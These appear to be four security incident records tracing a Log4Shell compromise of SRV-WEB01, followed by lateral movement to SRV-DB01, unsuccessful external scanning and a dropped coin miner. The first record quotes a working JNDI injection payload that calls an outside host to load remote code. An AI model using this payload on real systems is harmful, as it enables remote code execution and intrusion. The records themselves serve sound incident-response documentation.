title: Log4Shell exploitation of SRV-WEB01 (CVE-2021-44228)
description: Internet-facing Java application on SRV-WEB01 exploited via CVE-2021-44228 (Log4Shell). JNDI lookup ${jndi:ldap://192.0.2.66:1389/Exploit} in a request header triggered an outbound LDAP callback and remote class load, followed by a shell and payload download from 192.0.2.66. Containment and patching in progress.

title: Lateral movement from SRV-WEB01 to SRV-DB01
description: Following the Log4Shell compromise of SRV-WEB01 (INC-2021-0211), a service-account SSH session was established from SRV-WEB01 (10.0.30.11) to SRV-DB01. Treated as post-exploitation lateral movement. Service-account credentials rotated.

title: Internet-wide Log4Shell scanning (no successful exploit)
description: Mass scanning for CVE-2021-44228 observed from 198.51.100.23 against the perimeter. Probes hit WIN-WKS-023 and other hosts with no vulnerable Log4j2 listener. Closed after confirming no JNDI callback originated from internal hosts.

title: Coin miner dropped on SRV-WEB01
description: An opportunistic cryptominer (kdevtmpfsi) was dropped on SRV-WEB01 via the Log4Shell foothold (INC-2021-0211). Host isolated; forensic image taken before remediation.
